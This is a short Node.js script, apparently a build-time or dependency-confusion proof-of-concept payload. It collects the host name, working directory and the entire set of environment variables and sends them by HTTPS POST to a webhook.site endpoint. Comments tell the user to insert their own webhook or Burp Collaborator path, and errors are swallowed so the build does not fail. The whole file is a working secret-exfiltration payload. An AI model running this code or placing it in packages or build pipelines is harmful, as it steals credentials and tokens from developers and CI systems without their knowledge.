const https = require('https');
const os = require('os');

const data = JSON.stringify({
  time: new Date().toISOString(),
  hostname: os.hostname(),
  cwd: process.cwd(),
  env: process.env
});

// Replace ONLY the path below (after /) with your real webhook.site ID or Collaborator path
const options = {
  hostname: 'webhook.site',
  path: '/7d536e12-8d30-42eb-9b8e-0f9ce5bb61fe', // <- 🔁 CHANGE THIS
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  }
};

const req = https.request(options, (res) => {
  // optional response logging
});
req.on('error', (e) => {
  // silently fail, avoid crashing build
});
req.write(data);
req.end();
